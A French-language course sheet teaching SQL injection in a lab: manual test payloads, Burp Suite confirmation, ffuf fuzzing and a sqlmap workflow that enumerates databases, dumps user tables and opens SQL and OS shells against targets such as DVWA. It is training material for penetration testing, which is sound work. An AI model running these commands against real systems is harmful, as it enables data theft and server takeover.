---
aliases:
  - "SQL INJECTION (SQLi) AVEC SQLMAP + TECHNIQUES MANUELLES"
  - "01-13 | SQL INJECTION (SQLi) AVEC SQLMAP + TECHNIQUES MANUELLES"
archetype: cour
module: "GEN (Culture Générale & Hors Cursus)"
cssclasses:
  - max
tags:
  - attaque/injection-sql
  - application/web
  - attaque/exploitation
  - base-de-donnees
  - commande/curl
  - commande/wget
  - donnee/exfiltration
  - erreur/sql
  - exploitation
  - fuzzing
  - outil/burp-suite
  - outil/ffuf
  - outil/mysql-client
  - outil/psql
  - outil/sqlmap
  - outil/sqlite3
  - vulnerabilite/injection-sql
  - web/requete
---

# 01-13 | SQL INJECTION (SQLi) AVEC SQLMAP + TECHNIQUES MANUELLES

> [!goal] Objectifs Pédagogiques
> À la fin de cette fiche, je dois être capable de :
> 1.  Détecter une **SQL Injection (SQLi)** manuellement.
> 2.  Confirmer la vulnérabilité avec *Burp Suite* ou des requêtes HTTP.
> 3.  Lancer *SQLmap* sur un paramètre vulnérable.
> 4.  Extraire des bases de données (BDD), tables, colonnes et données.
> 5.  Obtenir éventuellement un shell (OS-Shell / SQL-Shell) dans un environnement contrôlé.
> 6.  Documenter l'impact et l'exploitation d'une SQLi.

## 📝 Synthèse du Cours

Ce module couvre les techniques de détection et d'exploitation des **injections SQL (SQLi)**, depuis les méthodes manuelles jusqu'à l'utilisation de l'outil automatisé *SQLmap*. Il est conçu pour les niveaux Débutant à Avancé, avec des cibles typiques comme *DVWA*, *Mutillidae*, *WebGoat*, des applications PHP simples ou des plugins *WordPress* vulnérables.

### 1. Introduction à la SQL Injection

Une **injection SQL** est une faille de sécurité qui permet à un attaquant d'interférer avec les requêtes qu'une application fait à sa base de données sous-jacente. Elle peut permettre la lecture, la modification ou la suppression de données, l'exécution de commandes d'administration sur la base de données, voire la prise de contrôle du système d'exploitation du serveur.

> [!note] Définition Clé
> **SQL Injection (SQLi)** : Type d'attaque permettant d'exécuter des requêtes SQL arbitraires via des inputs utilisateur non validés, manipulant ainsi la base de données d'une application.

#### Pré-requis et Outils

Pour suivre ce module, il est nécessaire d'avoir validé les modules précédents (1 à 4), de disposer de *Burp Suite* opérationnel et d'une cible SQL vulnérable active (ex: DVWA, Mutillidae).

Les outils clés sont :
*   **Burp Suite** : Pour intercepter et modifier les requêtes HTTP.
*   **SQLmap** : Outil d'exploitation automatisée des SQLi.
*   **ffuf** : Pour le *fuzzing* des paramètres vulnérables.
*   **curl/wget** : Pour des tests rapides depuis le terminal.
*   **sqlite3/mysql-client/psql** : Pour la vérification côté base de données (en lab uniquement).

### 2. Détection Manuelle de SQL Injection

La détection manuelle est la première étape pour identifier une potentielle vulnérabilité SQLi. Elle implique de tester la réaction de l'application à des caractères ou des expressions SQL spécifiques insérés dans les paramètres d'une requête.

#### 2.1. Tester les paramètres GET/POST
Les injections sont souvent possibles via des paramètres dans l'URL (GET) ou le corps de la requête (POST).

**Exemple d'URL vulnérable** : `http://192.168.56.20/product.php?id=1`

**Tests courants** :
*   Insertion d'une apostrophe simple (`'`) : `?id=1'`
    *   *Attendu* : Une erreur SQL peut apparaître, indiquant que la chaîne a rompu la syntaxe SQL.
*   Condition toujours vraie (`OR 1=1`) : `?id=1 OR 1=1`
    *   *Attendu* : Si le nombre de résultats augmente ou si la page change de manière significative, cela peut indiquer que la condition SQL a été évaluée.
*   Condition toujours fausse (`AND 1=0`) : `?id=1 AND 1=0`
    *   *Attendu* : Si la page renvoie un résultat vide ou une erreur après avoir affiché du contenu auparavant, cela confirme que la requête SQL est modifiable.
*   Commentaire SQL (`--` ou `;--`) : `?id=1;--`
    *   *Attendu* : Le commentaire annule la fin de la requête SQL originale, potentiellement changeant le comportement de l'application.

#### 2.2. Signes d'injection
*   **Erreur SQL** visible (MySQL, PostgreSQL, MSSQL).
*   **Comportement différent** de l'application (changement de contenu, page blanche).
*   **Résultats multipliés** ou absence totale de résultats.
*   **Page blanche ou erreur HTTP 500**.

#### 2.3. Tester via `curl`
L'outil `curl` permet de simuler des requêtes HTTP directement depuis le terminal, utile pour des tests rapides.
```bash
curl "http://192.168.56.20/product.php?id=1'"
```*Critère* : Obtenir un changement de comportement de la page.

### 3. Confirmation de la Vulnérabilité avec Burp Suite

*Burp Suite* est un proxy d'interception permettant d'analyser et de modifier les requêtes HTTP/S.

#### Procédure :
1.  Configurer votre navigateur pour utiliser Burp Suite comme proxy (généralement `127.0.0.1:8080`).
2.  Activer l'interception dans Burp Suite.
3.  Naviguer vers la page vulnérable.
4.  Dans Burp Suite, la requête s'affiche dans l'onglet "Proxy". Envoyer la requête à l'onglet "Repeater".
5.  Dans "Repeater", tester différentes variantes des injections SQL mentionnées précédemment (ex: `id=1'`, `id=1%27`, `id=1 OR 1=1`).

*Objectifs* :
*   Confirmer la vulnérabilité en observant des réponses distinctes du serveur.
*   Identifier les parties de la requête qui réagissent aux injections.

*Critère* : Obtenir au moins une réponse distincte du serveur après modification de la requête.

### 4. Fuzzing des paramètres avec ffuf (Optionnel)

*ffuf* est un outil de *fuzzing* rapide et puissant, utile pour identifier des paramètres cachés ou inattendus qui pourraient être vulnérables.

```bash
ffuf -u "http://192.168.56.20/index.php?FUZZ=test" -w /usr/share/seclists/Fuzzing/parameters.txt
```
*Objectif* : Trouver des paramètres utiles (ex: `id`, `product`, `user`, `page`) qui pourraient être des points d'injection.

### 5. Exploitation Automatisée avec SQLmap

*SQLmap* est un outil open source qui automatise le processus de détection et d'exploitation des injections SQL.

#### 5.1. Test simple de détection
```bash
sqlmap -u "http://192.168.56.20/product.php?id=1" --batch
```
Le paramètre `--batch` confirme les options par défaut sans intervention de l'utilisateur.

#### 5.2. Test avec des cookies (si authentification requise)
Si l'application nécessite une session authentifiée, les cookies doivent être inclus.
```bash
sqlmap -u "http://192.168.56.20/product.php?id=1" --cookie="PHPSESSID=xxxxxx" --batch
```
Remplacez `xxxxxx` par la valeur réelle de votre `PHPSESSID`.

#### 5.3. Test d'un endpoint POST
Pour les requêtes POST, il est courant de capturer la requête via Burp Suite, de l'enregistrer dans un fichier texte, puis de la fournir à SQLmap.
```bash
sqlmap -r request.txt --batch
```
*Critère* : SQLmap doit identifier au moins un type d'injection (basée sur le booléen, le temps, ou l'erreur).

### 6. Extraction de la Base de Données

Une fois la vulnérabilité confirmée, *SQLmap* peut être utilisé pour extraire des informations de la base de données.

#### 6.1. Lister les bases de données (DBS)
```bash
sqlmap -u "http://192.168.56.20/product.php?id=1" --dbs --batch
```

#### 6.2. Lister les tables d'une BDD spécifique
```bash
sqlmap -u URL --db <nom_de_la_bdd> --tables --batch
```
Remplacez `<nom_de_la_bdd>` par le nom de la base de données que vous souhaitez cibler.

#### 6.3. Lister les colonnes d'une table spécifique
```bash
sqlmap -u URL -D <nom_de_la_bdd> -T <nom_de_la_table> --columns --batch
```
Remplacez `<nom_de_la_bdd>` et `<nom_de_la_table>` par les valeurs appropriées.

#### 6.4. Extraire (Dump) le contenu des colonnes
```bash
sqlmap -u URL -D <nom_de_la_bdd> -T <nom_de_la_table> -C <colonne1>,<colonne2> --dump --batch
```
*Critère* : Extraire avec succès un tableau d'utilisateurs (dans un environnement de laboratoire uniquement).

### 7. Shell SQL et Shell Système (Option Avancée)

Ces techniques permettent une interaction directe avec la base de données ou le système d'exploitation du serveur. **Elles ne doivent être utilisées qu'en laboratoire et jamais en entreprise sans autorisation explicite.**

#### 7.1. Shell SQL
Permet d'exécuter des requêtes SQL directement sur la base de données.
```bash
sqlmap -u URL --sql-shell
```

#### 7.2. Shell OS (Système d'Exploitation)
Si le serveur est très vulnérable (ex: *DVWA low*, *Metasploitable*) et que les permissions sont suffisantes, il est possible d'obtenir un shell sur le système d'exploitation.
```bash
sqlmap -u URL --os-shell
```
*Critère* : Obtenir un shell SQL. Un shell OS est un bonus et dépend fortement de la configuration de la cible.

### 8. Fiche d'exposition SQLi

La documentation de la vulnérabilité est cruciale. Une fiche d'exposition claire permet de synthétiser les informations clés.

| URL          | Paramètre | Type SQLi       | BDD Tables        | Impact | Notes         |
| :----------- | :-------- | :-------------- | :---------------- | :----- | :------------ |
| /product.php | id        | boolean-based   | dwva users, products | High   | Extraction OK |

## 🧠 Carte Mentale / Schéma
```mermaid
graph TD
    A["Détection & Exploitation SQLi"] --> B{Détection Manuelle}
    B --> C{Burp Suite: Confirmation}
    C --> D{SQLmap: Scan Automatisé}
    D --> E{Extraction de Données}
    E --> F{Shell SQL/OS (Avancé)}
    F --> G{Documentation & Rapport}

    B --> B1["Tester '"]
    B --> B2["Tester 'OR 1=1'"]
    B --> B3["Tester 'AND 1=0'"]
    B --> B4["Tester ';--'"]
    B --> B5["Signes: Erreurs, Comportement"]

    C --> C1["Intercepter Requête"]
    C --> C2["Envoyer à Repeater"]
    C --> C3["Modifier & Observer Réponse"]

    D --> D1["sqlmap -u URL --batch"]
    D --> D2["sqlmap -r request.txt (POST)"]
    D --> D3["sqlmap --cookie (Authentification)"]

    E --> E1["Lister DBS (--dbs)"]
    E --> E2["Lister Tables (-D db --tables)"]
    E --> E3["Lister Colonnes (-D db -T table --columns)"]
    E --> E4["Dumper Contenu (-D db -T table -C col --dump)"]

    F --> F1["sqlmap --sql-shell"]
    F --> F2["sqlmap --os-shell (Lab uniquement)"]
```

## ❓ Quiz de Révision (Active Recall)
> [!question] Question 1
> Quelle est la première étape essentielle pour détecter manuellement une SQL Injection sur un paramètre GET ?
> > [!success]- Réponse
> > La première étape consiste à ajouter une apostrophe simple (`'`) à la fin de la valeur du paramètre dans l'URL (ex: `?id=1'`) et d'observer la réaction du serveur.

> [!question] Question 2
> Pourquoi est-il crucial d'utiliser *Burp Suite* après une détection manuelle de SQLi ?
> > [!success]- Réponse
> > *Burp Suite* permet d'intercepter, d'analyser et de modifier précisément les requêtes HTTP/S, confirmant ainsi la vulnérabilité en observant les réponses distinctes du serveur et en identifiant les parties de la requête qui réagissent à l'injection.

> [!question] Question 3
> Citez deux commandes *SQLmap* différentes pour extraire des informations d'une base de données, et expliquez leur rôle.
> > [!success]- Réponse
> > 1.  `sqlmap -u URL --dbs` : Cette commande liste toutes les bases de données accessibles par l'utilisateur de la base de données.
> > 2.  `sqlmap -u URL -D <nom_de_la_bdd> -T <nom_de_la_table> --columns` : Cette commande liste toutes les colonnes d'une table spécifique au sein d'une base de données donnée.